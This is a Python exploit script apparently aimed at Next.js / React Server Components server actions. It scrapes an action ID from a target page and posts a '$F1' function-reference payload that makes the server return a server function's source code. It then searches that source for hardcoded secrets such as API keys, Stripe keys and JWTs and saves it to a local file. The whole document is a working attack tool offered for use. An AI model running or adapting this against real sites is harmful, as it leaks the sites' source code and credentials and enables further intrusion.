#!/usr/bin/env python3
"""
Source Code Leak via $F Function Reference
Exploits implicit stringification of function references to leak
server-side source code including hardcoded secrets.
"""

import re
import sys
import json
import argparse
import requests
from requests.adapters import HTTPAdapter

requests.packages.urllib3.disable_warnings()


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('target')
    parser.add_argument('action_id', nargs='?')
    parser.add_argument('--proxy')
    parser.add_argument('--no-verify', action='store_true')
    parser.add_argument('-v', '--verbose', action='store_true')
    return parser.parse_args()


def get_action_id(target, session):
    try:
        r = session.get(target, timeout=10)
        matches = re.findall(r'[a-f0-9]{40,42}', r.text)
        if matches:
            return list(dict.fromkeys(matches))[-1]
        raise ValueError('No action ID found')
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            print(f"[*] Response: {r.text[:200]}")
        sys.exit(1)


def exploit(target, action_id, session):
    payload = {
        '0': '["$F1"]',
        '1': json.dumps({'id': action_id, 'bound': None})
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',  # noqa
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/x-component',
        'Next-Action': action_id,
    }

    try:
        return session.post(target, data=payload, headers=headers, timeout=15)
    except Exception as e:
        print(f"[!] Failed: {e}")
        return None


def extract_source(text):
    match = re.search(r'"processed":"((?:[^"\\]|\\.)*)"', text)
    if match:
        source = match.group(1)
        source = source.replace('\\n', '\n').replace('\\"', '"')
        source = source.replace('\\t', '\t').replace('\\\\', '\\')
        return source

    match = re.search(r'"((?:async )?function\s+\w+(?:[^"\\]|\\.)*)"', text)
    if match:
        source = match.group(1)
        return source.replace('\\n', '\n').replace('\\"', '"')

    return None


def find_secrets(source):
    patterns = [
        r'(SECRET|KEY|PASSWORD|TOKEN|API_KEY|JWT_SECRET)[^=]*=\s*["\'][^"\']+["\']',  # noqa
        r'sk_(live|test)_[a-zA-Z0-9_]+',
        r'eyJhbGciOiJ[^\s\']+',
    ]

    secrets = []
    for p in patterns:
        secrets.extend(re.findall(p, source, re.I | re.M))

    return [s[0] if isinstance(s, tuple) else s for s in secrets]


def main():
    global args
    args = parse_args()

    print('=' * 60)
    print('Source Code Leak Exploit')
    print('=' * 60)
    print(f'Target: {args.target}')
    print()

    session = requests.Session()

    proxies = {}
    if args.proxy:
        proxies = {'http': args.proxy, 'https': args.proxy}
        print(f'[*] Using proxy: {args.proxy}')

    session.proxies.update(proxies)
    session.verify = not args.no_verify

    adapter = HTTPAdapter(max_retries=2)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    try:
        if args.action_id:
            action_id = args.action_id
            print(f'Action ID: {action_id}')
        else:
            print('[*] Getting action ID...')
            action_id = get_action_id(args.target, session)
            print(f'Action ID: {action_id}')

        print('\n[*] Sending $F1...')
        r = exploit(args.target, action_id, session)

        if not r:
            sys.exit(1)

        print(f'[*] Status: {r.status_code}')

        source = extract_source(r.text)
        if source:
            print('\n' + '=' * 60)
            print('*** SOURCE CODE LEAKED ***')
            print('=' * 60)
            print(source)
            print('=' * 60)

            secrets = find_secrets(source)
            if secrets:
                print('\n[!] Secrets:')
                for s in secrets:
                    print(f'    {s}')

            with open('leaked.js', 'w') as f:
                f.write(source)
            print('\n[*] Saved to leaked.js')

        else:
            print('\n[*] Response:', r.text[:1000])
            if len(r.text) > 1000:
                print('...')
            print('\n[!] No source found')

            if args.verbose:
                print('\n[*] Full:', r.text)

    except KeyboardInterrupt:
        print('\n[!] Interrupted')
        sys.exit(0)
    except Exception as e:
        print(f'[!] Error: {e}')
        if args.verbose:
            import traceback
            traceback.print_exc()


if __name__ == '__main__':
    main()
